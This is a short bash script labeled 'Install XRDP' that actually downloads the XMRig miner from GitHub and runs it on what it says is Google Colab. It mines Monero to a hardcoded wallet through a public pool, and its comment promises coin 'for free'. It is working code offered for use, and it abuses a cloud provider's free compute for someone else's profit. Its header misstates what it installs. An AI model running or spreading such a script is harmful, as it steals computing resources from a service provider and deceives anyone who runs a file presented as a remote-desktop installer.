#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 485edeQxxUp6zHWP8xVyMuKVVg8pJ1q7XL7YVoEYsq3SFFjaeRDEyv3XBG345z1LEC8pjhzmt6HosS9zc8UJGJYn7HtPrRJ -k --tls --rig-id GC-US
